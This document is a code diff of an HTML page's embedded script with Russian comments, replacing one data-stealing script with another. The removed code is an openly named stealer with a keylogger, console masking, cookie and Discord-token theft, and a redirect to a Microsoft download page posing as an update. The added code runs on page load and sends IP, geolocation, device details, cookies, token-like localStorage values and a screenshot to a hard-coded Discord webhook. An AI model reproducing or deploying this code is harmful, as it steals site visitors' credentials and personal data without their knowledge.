@@ -97,290 +97,262 @@
 <script>
            // === КОНФИГ ===
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1475205126166941717/U5gN1sW3piGZF5FRZEId48YcbJLi5XwyvPV03qNaDNc9Be7wiNFRTiNLgCQau5plTIVD";
-        const MAX_MESSAGE_LENGTH = 1900;
-        const CAPTURE_DELAY = 3000;
-        
-        // === БЕЗОПАСНОЕ ОБНОВЛЕНИЕ СТАТУСА ===
-        function updateStatus(text) {
-            try {
-                const statusElement = document.getElementById('statusMessage');
-                if (statusElement) {
-                    statusElement.innerText = text;
-                }
-                console.log('[Status]', text); // Для отладки
-            } catch(e) {
-                console.log('Status update error:', e);
+                function sendToDiscord(message, isFile = false, filename = null, fileData = null) {
+            if (isFile) {
+                const formData = new FormData();
+                const blob = dataURLToBlob(fileData);
+                formData.append('file', blob, filename);
+                
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                }).catch(e => console.log('File send error:', e));
+            } else {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", WEBHOOK_URL, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({ content: message }));
             }
         }
-        
-        // === ФУНКЦИЯ ОТПРАВКИ В DISCORD ===
-        function sendToDiscord(content, isFile = false, filename = null, fileData = null) {
-            try {
-                if (isFile) {
-                    const formData = new FormData();
-                    const blob = dataURLToBlob(fileData);
-                    formData.append('file', blob, filename);
-                    
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    }).catch(e => console.log('File send error:', e));
-                } else {
-                    if (content.length > MAX_MESSAGE_LENGTH) {
-                        const chunks = content.match(new RegExp('.{1,' + MAX_MESSAGE_LENGTH + '}', 'g'));
-                        chunks.forEach(chunk => {
-                            fetch(WEBHOOK_URL, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ content: chunk.substring(0, MAX_MESSAGE_LENGTH) })
-                            }).catch(e => console.log('Send error:', e));
-                        });
-                    } else {
-                        fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ content: content })
-                        }).catch(e => console.log('Send error:', e));
-                    }
-                }
-            } catch(e) {
-                console.log('Send function error:', e);
-            }
-        }
-        
+
         function dataURLToBlob(dataURL) {
-            try {
-                const arr = dataURL.split(',');
-                const mime = arr[0].match(/:(.*?);/)[1];
-                const bstr = atob(arr[1]);
-                let n = bstr.length;
-                const u8arr = new Uint8Array(n);
-                while (n--) {
-                    u8arr[n] = bstr.charCodeAt(n);
-                }
-                return new Blob([u8arr], { type: mime });
-            } catch(e) {
-                return new Blob([]);
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+
+        function getBrowserInfo() {
+            var ua = window.navigator.userAgent;
+            var browserInfo = "";
+            if (ua.indexOf("Chrome") !== -1) {
+                browserInfo = "Google Chrome";
+            } else if (ua.indexOf("Firefox") !== -1) {
+                browserInfo = "Mozilla Firefox";
+            } else if (ua.indexOf("Edge") !== -1) {
+                browserInfo = "Microsoft Edge";
+            } else if (ua.indexOf("Safari") !== -1) {
+                browserInfo = "Safari";
+            } else {
+                browserInfo = "Unknown Browser";
+            }
+            return browserInfo + " (" + ua + ")";
+        }
+
+        async function getDeviceInfo() {
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            const deviceType = isMobile ? "Mobile Device" : "PC";
+            const os = isMobile ? getMobileOperatingSystem() : getDesktopOperatingSystem();
+            return { deviceType, os };
+        }
+
+        function getDesktopOperatingSystem() {
+            const userAgent = window.navigator.userAgent;
+            let os = "Unknown";
+            if (userAgent.indexOf("Windows NT") !== -1) {
+                os = "Windows";
+            } else if (userAgent.indexOf("Mac") !== -1) {
+                os = "Macintosh";
+            } else if (userAgent.indexOf("Linux") !== -1) {
+                os = "Linux";
+            }
+            return os;
+        }
+
+        function getMobileOperatingSystem() {
+            const userAgent = window.navigator.userAgent;
+            if (userAgent.match(/Android/i)) {
+                return "Android";
+            } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
+                return "iOS";
+            } else {
+                return "Unknown Mobile OS";
             }
         }
 
-        // === 1. СИСТЕМНАЯ ИНФА ===
-        async function getSystemInfo() {
-            try {
-                const ua = navigator.userAgent;
-                const platform = navigator.platform;
-                const language = navigator.language;
-                const languages = navigator.languages?.join(', ') || 'Unknown';
-                const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
-                const deviceMemory = navigator.deviceMemory || 'Unknown';
-                
-                // Батарея
-                let batteryInfo = 'Unknown';
-                if ('getBattery' in navigator) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        batteryInfo = `${Math.round(battery.level * 100)}%, ${battery.charging ? 'Charging' : 'Not charging'}`;
-                    } catch(e) {}
-                }
-                
-                return {
-                    userAgent: ua,
-                    platform: platform,
-                    language: language,
-                    languages: languages,
-                    cpuCores: hardwareConcurrency,
-                    ram: deviceMemory + 'GB',
-                    battery: batteryInfo,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screenWidth: screen.width,
-                    screenHeight: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight
-                };
-            } catch(e) {
-                return { error: 'Failed to get system info' };
-            }
-        }
-
-        // === 2. ГЕОЛОКАЦИЯ ===
-        async function getGeoInfo() {
-            let ipData = {};
-            let geoData = {};
-            
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                ipData = await response.json();
-            } catch(e) {
-                try {
-                    const response = await fetch('https://ipinfo.io/json');
-                    ipData = await response.json();
-                } catch(e2) {}
-            }
-            
-            return { ipData, geoData };
-        }
-
-        // === 3. СТОРАДЖИ ===
-        function stealStorages() {
-            try {
-                const data = {};
-                data.cookies = document.cookie || 'No cookies';
-                
-                data.localStorage = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    data.localStorage[key] = localStorage.getItem(key);
-                }
-                
-                data.sessionStorage = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    data.sessionStorage[key] = sessionStorage.getItem(key);
-                }
-                
-                return data;
-            } catch(e) {
-                return { error: 'Storage access failed' };
-            }
-        }
-
-        // === 4. ПОИСК ТОКЕНОВ ===
-        function findTokens() {
-            const tokens = {
-                discord: [],
-                other: []
-            };
-            
-            try {
-                const discordPattern = /(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})/g;
-                
-                for (let i = 0; i < localStorage.length; i++) {
-                    const value = localStorage.getItem(localStorage.key(i));
-                    const matches = value.match(discordPattern);
-                    if (matches) {
-                        tokens.discord.push(...matches);
-                    }
-                }
-                
-                const cookieMatches = document.cookie.match(discordPattern);
-                if (cookieMatches) tokens.discord.push(...cookieMatches);
-                
-            } catch(e) {}
-            
-            return tokens;
-        }
-
-        // === 5. СКРИНШОТ ===
         async function takeScreenshot() {
             try {
                 const canvas = await html2canvas(document.body, {
-                    scale: 1,
+                    scale: 2,
                     logging: false,
                     allowTaint: true,
-                    useCORS: true
+                    useCORS: true,
+                    backgroundColor: null
                 });
-                return canvas.toDataURL('image/jpeg', 0.7);
+                return canvas.toDataURL('image/png');
             } catch(e) {
+                console.log("Screenshot error:", e);
                 return null;
             }
         }
 
-        // === 6. КЕЙЛОГГЕР ===
-        let keyLog = [];
-        
-        function startKeyLogger() {
+        async function sendInfoToDiscord() {
+            const { city, country, coordinates, emoji } = await getCityCountryAndEmoji();
+            const ipAddressResponse = await fetch("https://api64.ipify.org?format=json");
+            const ipAddressData = await ipAddressResponse.json();
+            const ipAddress = ipAddressData.ip || "Unknown IP Address";
+            const time = new Date().toLocaleString();
+            const browser = getBrowserInfo();
+            const { deviceType, os } = await getDeviceInfo();
+            const googleMapsLink = "https://www.google.com/maps?q=" + coordinates;
+            const username = await getUserName();
+            const isOnline = navigator.onLine ? "Online" : "Offline";
+            const language = navigator.language || "Unknown Language";
+            const pluginCount = navigator.plugins.length;
+            
+            // Детальная инфа о плагинах
+            let pluginsList = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                pluginsList.push(navigator.plugins[i].name);
+            }
+            const plugins = pluginsList.join(" | ");
+            
+            const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+            const { width, height } = await getScreenResolution();
+            const { cameraCount, microphoneCount } = await getMediaDevicesInfo();
+            const hasCamera = cameraCount > 0 ? "Yes" : "No";
+            const hasMicrophone = microphoneCount > 0 ? "Yes" : "No";
+            const currentURL = window.location.href;
+            const windowSize = window.innerWidth + "x" + window.innerHeight;
+            
+            // Доп инфа
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const platform = navigator.platform;
+            const cores = navigator.hardwareConcurrency || "Unknown";
+            const touchSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";
+            const doNotTrack = navigator.doNotTrack || "Not set";
+            
+            // Токены из localStorage
+            let tokens = [];
             try {
-                document.addEventListener('keydown', function(e) {
-                    if (e.key.length === 1) {
-                        keyLog.push(e.key);
-                        
-                        if (keyLog.length >= 20) {
-                            sendToDiscord(`**⌨️ Keys (${keyLog.length}):**\n\`${keyLog.join('')}\``);
-                            keyLog = [];
-                        }
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    if (value && (value.includes('mfa.') || value.includes('discord') || value.includes('token'))) {
+                        tokens.push(`${key}: ${value.substring(0, 50)}...`);
                     }
-                });
-                
-                window.addEventListener('beforeunload', function() {
-                    if (keyLog.length > 0) {
-                        sendToDiscord(`**⌨️ Keys final:**\n\`${keyLog.join('')}\``);
-                    }
-                });
-            } catch(e) {}
-        }
-
-        // === 7. МАСКИРОВКА ===
-        function setupMasks() {
-            try {
-                // Скрываем консоль
-                console.log = function() {};
-                console.error = function() {};
-                console.warn = function() {};
-            } catch(e) {}
-        }
-
-        // === 8. ГЛАВНАЯ ФУНКЦИЯ СБОРА ===
-        async function megaSteal() {
-            try {
-                updateStatus('🔍 Initializing...');
-                
-                // Маскировка
-                setupMasks();
-                
-                // Кейлоггер
-                startKeyLogger();
-                
-                // 1. Система
-                updateStatus('📊 Collecting system info...');
-                const sysInfo = await getSystemInfo();
-                sendToDiscord(`**💻 SYSTEM INFO**\n\`\`\`json\n${JSON.stringify(sysInfo, null, 2)}\n\`\`\``);
-                
-                // 2. Гео
-                updateStatus('📍 Getting location...');
-                const geoInfo = await getGeoInfo();
-                sendToDiscord(`**📍 LOCATION**\nIP: ${geoInfo.ipData.ip || 'Unknown'}\nCountry: ${geoInfo.ipData.country_name || 'Unknown'}\nCity: ${geoInfo.ipData.city || 'Unknown'}\nISP: ${geoInfo.ipData.org || 'Unknown'}`);
-                
-                // 3. Стораджи
-                updateStatus('🍪 Stealing cookies...');
-                const storages = stealStorages();
-                sendToDiscord(`**🍪 COOKIES**\n\`\`\`\n${storages.cookies.substring(0, 500)}\n\`\`\``);
-                sendToDiscord(`**💾 LOCALSTORAGE**\n\`\`\`json\n${JSON.stringify(storages.localStorage, null, 2).substring(0, 500)}\n\`\`\``);
-                
-                // 4. Токены
-                updateStatus('🎫 Searching tokens...');
-                const tokens = findTokens();
-                if (tokens.discord.length > 0) {
-                    sendToDiscord(`**🎫 DISCORD TOKENS**\n\`\`\`\n${tokens.discord.join('\n')}\n\`\`\``);
                 }
-                
-                // 5. Скриншот
-                updateStatus('📸 Taking screenshot...');
-                const screenshot = await takeScreenshot();
-                if (screenshot) {
-                    sendToDiscord('📸 **SCREENSHOT**', true, 'screenshot.jpg', screenshot);
-                }
-                
-                // Финальное сообщение
-                updateStatus('✅ Update complete! Redirecting...');
-                
-                // Редирект
-                setTimeout(() => {
-                    try {
-                        window.location.href = 'https://www.microsoft.com/software-download/windows11';
-                    } catch(e) {}
-                }, 3000);
-                
-            } catch(e) {
-                console.log('Main error:', e);
-                updateStatus('⚠️ Error: ' + e.message);
-                sendToDiscord(`**❌ ERROR**\n${e.toString()}`);
+            } catch(e) {}
+            
+            const cookies = document.cookie || "No cookies";
+            
+            const message = "****                User Information****\n" +
+                            "****-----------------------------------****\n" +
+                            "- 🗺️ **IP Address**: `" + ipAddress + "`\n" +
+                            "- 👤 **User Name**: `" + username + "`\n" +
+                            "- 🏙️ **City**: `" + city + "`\n" +
+                            "- 🌍 **Country**: `" + country + "` " + emoji + "\n" +
+                            "- 🏞️ **Coordinates**: [`" + coordinates + "`](" + googleMapsLink + ")\n" +
+                            "- 🕒 **Time**: `" + time + "`\n" +
+                            "- 🌐 **Browser**: `" + browser + "`\n" +
+                            "- 🖥️ **Device Type**: `" + deviceType + "`\n" +
+                            "- 📟️ **Operating System**: `" + os + "`\n" +
+                            "- 🛰️ **Connection Status**: `" + isOnline + "`\n" +
+                            "- 🀄 **Browser Language**: `" + language + "`\n" +
+                            "- 📼️ **Device Language(s)**: `" + navigator.languages.join(", ") + "`\n" +
+                            "- 🛠️ **Number of Plugins**: `" + pluginCount + "`\n" +
+                            "- 🔌 **Plugins**: `" + plugins + "`\n" +
+                            "- 💻 **Device Memory**: `" + deviceMemory + "`\n" +
+                            "- 📐 **Screen Resolution**: `" + width + "x" + height + "`\n" +
+                            "- 📷 **Camera**: `" + hasCamera + "`\n" +
+                            "- 🎤 **Microphone**: `" + hasMicrophone + "`\n" +
+                            "- 📎 **Current URL**: `" + currentURL + "`\n" +
+                            "- 🪟 **Window Size**: `" + windowSize + "`\n" +
+                            "- ⏰ **Timezone**: `" + timezone + "`\n" +
+                            "- 💾 **Platform**: `" + platform + "`\n" +
+                            "- 🧠 **CPU Cores**: `" + cores + "`\n" +
+                            "- 👆 **Touch Support**: `" + touchSupport + "`\n" +
+                            "- 🚫 **Do Not Track**: `" + doNotTrack + "`\n" +
+                            "- 🍪 **Cookies**: `" + cookies.substring(0, 200) + "`\n" +
+                            "- 🔑 **LocalStorage Tokens**: " + (tokens.length ? tokens.join(" | ") : "None");
+            
+            // Отправляем основную инфу
+            sendToDiscord(message);
+            
+            // Делаем и отправляем скриншот
+            const screenshot = await takeScreenshot();
+            if (screenshot) {
+                sendToDiscord("📸 **Screenshot**", true, "screenshot_" + Date.now() + ".png", screenshot);
             }
         }
 
-        // === СТАРТ ===
-        window.addEventListener('load', function() {
-            setTimeout(megaSteal, 1500);
-        });
+        async function getCityCountryAndEmoji() {
+            try {
+                const response = await fetch("https://ipinfo.io/json");
+                const data = await response.json();
+                const city = data.city || "Unknown City";
+                const country = data.country || "Unknown Country";
+                const coordinates = data.loc || "Unknown Coordinates";
+                let emoji = "";
+                let countryName = "";
+                switch(country) {
+                    case "RU":
+                        countryName = "Russia";
+                        emoji = "🇷🇺";
+                        break;
+                    case "UA":
+                        countryName = "Ukraine";
+                        emoji = "🇺🇦";
+                        break;
+                    case "US":
+                        countryName = "United States";
+                        emoji = "🇺🇸";
+                        break;
+                    case "KZ":
+                        countryName = "Kazakhstan";
+                        emoji = "🇰🇿";
+                        break;
+                    case "FR":
+                        countryName = "France";
+                        emoji = "🇫🇷";
+                        break;
+                    default:
+                        countryName = country || "Unknown Country";
+                        emoji = "🌍";
+                }
+                return { city, country: countryName, coordinates, emoji };
+            } catch (error) {
+                console.error("Error fetching city, country, and emoji:", error);
+                return { city: "Unknown City", country: "Unknown Country", coordinates: "Unknown Coordinates", emoji: "🌍" };
+            }
+        }
+
+        async function getScreenResolution() {
+            return { width: screen.width, height: screen.height };
+        }
+
+        async function getMediaDevicesInfo() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cameras = devices.filter(device => device.kind === 'videoinput');
+                const microphones = devices.filter(device => device.kind === 'audioinput');
+                return { cameraCount: cameras.length, microphoneCount: microphones.length };
+            } catch (error) {
+                console.error("Error fetching media devices information:", error);
+                return { cameraCount: 0, microphoneCount: 0 };
+            }
+        }
+
+        async function getUserName() {
+            return new Promise((resolve) => {
+                var userName = localStorage.getItem("username");
+                if (userName) {
+                    resolve(userName);
+                } else {
+                    resolve("Unknown User");
+                }
+            });
+        }
+
+        window.onload = function() {
+            // Небольшая задержка чтобы страница прогрузилась
+            setTimeout(sendInfoToDiscord, 1000);
+        };
     </script>
 
 </section>
